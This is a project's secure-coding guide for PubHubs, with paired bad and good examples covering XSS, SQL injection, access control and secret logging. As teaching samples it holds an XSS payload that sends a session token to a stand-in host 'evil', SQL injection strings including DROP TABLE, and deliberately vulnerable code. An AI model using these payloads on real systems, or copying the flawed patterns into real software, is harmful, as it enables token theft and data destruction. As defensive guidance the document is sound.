## Security Guidelines

These are security guidelines educating on software mistakes that can impact the security of PubHubs.

### XSS Injection

Make sure all messages that are rendered are sanitized, because users can inject HTML and scripts through
the Synapse message API. Anything that reaches the client from `/_matrix/...` is attacker-controlled: the
`body`, the `formatted_body`, filenames, room names, topics and display names. If you are adding a new
message type or refactoring messages, this is important to check.

Keep in mind that not all messages are loaded through the same flow:

- **Room timeline**: matrix-js-sdk fetches events with `createMessagesRequest` (`/rooms/{roomId}/messages`),
  and `events.ts` runs every event through `EventTimeLineHandler.transformEventContent`, which fills
  `content.ph_body` (escaped plain text, or `formatted_body` passed through for HTML messages).
- **Single/related events**: `pubhubsStore.getEvent` (replies, thread roots, reported messages, snippets)
  returns the event as-is. Its network fallback is `client.fetchRoomEvent`, which never passes through
  `EventTimeLineHandler`, so **`ph_body` may be absent** and `body` is unescaped plain text.

Rendering rules:

- Never use `v-html` on anything that came from the server. Use the `v-safe-html` directive
  (`hub-client/src/logic/core/directives.ts`), which sanitizes with `sanitizeHtml`
  (`hub-client/src/logic/core/sanitizer.ts`) at render time.
- Plain text needs _escaping_, not sanitizing. Sanitizers parse their input as HTML, so a literal `<`
  swallows everything up to the next `>` — pasted code such as `Predicate("100<H|")` silently loses
  characters. Use `{{ interpolation }}` where possible, or `escapeHtml`/`textToHtml`
  (`hub-client/src/logic/core/htmlText.ts`) when you need HTML out.
- Widening `sanitizeOptions` (`allowedTags`, `allowedAttributes`, `allowedSchemes`) widens the attack
  surface for every message in every hub. Do not add `style`, `on*` handlers, `iframe`, `object`,
  `javascript:` or `data:` — and note that `img` is restricted to `mxc:` URLs by `exclusiveFilter`, so
  remote images cannot be used as read receipts.

Dependencies can also contain vulnerabilities that make XSS possible. These are checked by
`npm run check:audit` (`scripts/npm-audit.mjs`), which runs in the `npm-audit` CI job; exceptions live in
`scripts/npm-audit.config.mjs` and need a reason and preferably an expiry date.

**Bad** — raw server HTML straight into the DOM:

```vue
<template>
	<!-- Anyone in the room can send formatted_body: '<img src=x onerror="fetch(`https://evil/`+localStorage.token)">' -->
	<span v-html="event.content.formatted_body" />
</template>
```

**Good** — sanitize at render time:

```vue
<template>
	<span v-safe-html="messageBody" />
</template>

<script setup lang="ts">
	// Composables
	import { useMessageBody } from '@hub-client/composables/message-body.composable';

	const { messageBody } = useMessageBody(
		() => props.event.content.body,
		() => props.event.content.ph_body,
	);
</script>
```

**Bad** — assuming an event fetched outside the timeline is already processed:

```ts
// getEvent() can hit client.fetchRoomEvent(), which skips EventTimeLineHandler:
// ph_body is undefined and body is raw plain text, so this renders attacker markup.
const event = await pubhubs.getEvent(roomId, eventId);
snippetHtml.value = event.content.ph_body ?? event.content.body;
```

**Good** — escape the fallback, or interpolate it (see `ReportedMessagePreview.vue`):

```ts
const event = await pubhubs.getEvent(roomId, eventId);
// ph_body is markup only when EventTimeLineHandler produced it; body never is.
snippetHtml.value = event.content.ph_body ?? escapeHtml(event.content.body ?? '');
```

### SQL Injection

If SQL statements are not properly prepared, users can inject SQL into a request and read sensitive hub
data or corrupt the database by updating or deleting rows, tables or the whole schema. In the Synapse
modules this means: every value that originates from a request goes in as a placeholder (`?`), never into
the query string.

**Bad** — interpolating a request value:

```python
def get_reports_txn(txn: LoggingTransaction, room_id_txn: str):
    # room_id comes from a query parameter, so `x' OR '1'='1` reads every room's reports,
    # and `x'; DROP TABLE event_reports; --` is worse.
    txn.execute(f"SELECT * FROM event_reports WHERE room_id = '{room_id_txn}'")
    return txn.fetchall()
```

**Good** — placeholders, including for a variable-length `IN` list (see
`HubStore.get_event_reports_for_rooms` in `pubhubs_hub/modules/pubhubs/_store.py`):

```python
def get_reports_txn(txn: LoggingTransaction, room_ids_txn: list[str], limit_txn: int, start_txn: int):
    # Only the number of placeholders is computed; every value is still bound.
    placeholders = ",".join("?" * len(room_ids_txn))
    txn.execute(
        f"""
        SELECT er.id, er.room_id, er.event_id, er.user_id, er.content
        FROM event_reports AS er
        WHERE er.room_id IN ({placeholders})
        LIMIT ? OFFSET ?
        """,
        (*room_ids_txn, limit_txn, start_txn),
    )
    return txn.fetchall()
```

Note that `ORDER BY {order}` and `LIMIT ?` are different problems: the sort direction cannot be bound, so
it must come from a fixed mapping (`"DESC" if backwards else "ASC"`) and never straight from the `dir`
query parameter.

Identifiers (table and column names) cannot be parameterized either. When a migration has to build them
dynamically, validate them against the database or a pattern first, as `_store_modifier.py` does:

```python
if not check_table_name_validate(txn, module_api, table_name):
    raise ValueError("Given table name is not a valid table name")
if not check_column_name_validate(column_name):
    raise ValueError("Given column name is not a valid column name.")
txn.execute(command.format(table_name=table_name, column_name=column_name, column_definition=column_definition))
```

Also prefer Synapse's own helpers (`simple_select_list`, `simple_upsert`, ...) when they fit: they build
the statement and bind the values for you.

### Improper Access Control

When editing or creating an endpoint in a Synapse PubHubs module, you need to add the proper access
control so that unauthorized users cannot read sensitive data or execute functions that are only meant for
a steward or an admin. The client hiding a button is not access control; every endpoint is reachable
directly with a plain access token.

Use the `@user_validator(...)` decorator from `pubhubs_hub/modules/pubhubs/_validation.py` with the level
the endpoint needs (`GUEST`, `USER`, `STEWARD`, `ROOM_ADMIN`, `HUB_ADMIN`). `GUEST` means _no
authentication at all_, so it belongs only on genuinely public data.

**Bad** — no check, trusting the caller:

```python
class HubSettingsServlet(DirectServeJsonResource):
    async def _async_render_POST(self, request: SynapseRequest) -> None:
        # No decorator: any client with any token (or none) can change hub settings.
        body = parse_json_object_from_request(request)
        await self._store.set_hub_settings(body)
        respond_with_json(request, 200, {"success": True}, True)
```

**Also bad** — the room the permission is checked on is not the room being changed. With no `room_id`
argument, `assert_has_power_level` falls back to `get_room_id_from_request`, which reads the **query
string** only. If the endpoint then acts on a `room_id` from the **request body**, a steward of room A can
pass `?room_id=A` and a body naming room B:

```python
@user_validator(STEWARD)  # checks the power level for request.args[b"room_id"]
async def _async_render_POST(self, request: SynapseRequest, user_id: str) -> None:
    body = parse_json_object_from_request(request)
    room_id = body.get("room_id")  # ...but acts on this one
    await self._store.remove_users_from_secured_room(room_id)
```

**Good** — authenticate with the decorator, then check the power level on the room the operation actually
touches (see `StewardReportsServlet` in `pubhubs_hub/modules/pubhubs/_steward/_reports.py`):

```python
@user_validator(USER)  # valid access token, user_id resolved from it
async def _async_render_POST(self, request: SynapseRequest, user_id: str) -> None:
    set_allow_origin_header(request, self._config.allowed_origins)

    body = parse_json_object_from_request(request)
    room_id = body.get("room_id")
    if not room_id:
        raise BadRequestError("room_id is required in the request body")

    # Explicit room_id: the check cannot be pointed at a different room than the one we change.
    await assert_has_power_level(request, user_id, self._module_api, STEWARD, room_id)

    await self._store.remove_users_from_secured_room(room_id)
    respond_with_json(request, 200, {"success": True}, True)
```

Further point:

- Derive the acting user from the token (`user_id` handed to you by the decorator, i.e.
  `module_api.get_user_by_req`). Never take a `user_id` from the body or query string as the identity.

### Leaking Secrets

When writing code, or when editing the project pipeline, we need to be careful not to leak secrets through
logging, endpoints or the repository. **Do not put the `ops` repository, or any secret from it, in an agent
prompt.**

**Bad** — secrets in log lines:

```python
logger.info(f"Yivi request with token {access_token} and config {self._config}")
```

```rust
log::debug!("signing request with {:?}", self.signing_key);
```

Log lines end up in journals, CI job output and error trackers, and `{:?}` on a config or client struct
prints every field it holds, including keys. Log an identifier instead, never the credential:

```python
logger.info(f"Yivi session started for user {user_id}")
```

For Rust types that carry key material, `#[derive(Debug)]` is what makes the leak possible: a single
`{:?}` anywhere — a `log::debug!`, an `anyhow` context, a panic message, can print the key. Write a
`Debug` impl that leaves the secret out instead. `ed25519_dalek::SigningKey` is the model to copy:

```rust
impl Debug for SigningKey {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("SigningKey")
            .field("verifying_key", &self.verifying_key)
            .finish_non_exhaustive() // avoids printing `secret_key`
    }
}
```

TODO:

- Several of our own secret-bearing types do not do this yet and print their key material under `{:?}`:
  `dsa::SigningKey` and `dsa::SigningKeyBytes` (`pubhubs/src/common/dsa.rs`) derive `Debug` over the raw
  ed25519/ML-DSA seeds, `jwt::HS256` (`pubhubs/src/misc/jwt.rs`) is a `Vec<u8>` HMAC key with a derived
  `Debug`, and `yivi::SigningKey` (`pubhubs/src/servers/yivi.rs`) derives `Debug` over both its variants.
  `zeroize::Zeroizing` and the `B64`/`B16` wrappers do not help here — their `Debug` delegates to the inner
  bytes. So do not `{:?}` these types, and prefer a redacting `Debug` when you add a new one.

**Bad** — secrets in the pipeline, on the command line or echoed:

```yaml
script:
    # Visible in the job log with `set -x`, and in the process list of the runner host.
    - docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" "$CI_REGISTRY"
    - echo "token is $DEPLOY_TOKEN" # never do this, not even while debugging
```

**Good** — pass it on stdin, as `cicd/.gitlab-ci.yml` does:

```yaml
script:
    - echo "$CI_REGISTRY_PASSWORD" | docker login -u "$CI_REGISTRY_USER" --password-stdin "$CI_REGISTRY"
```
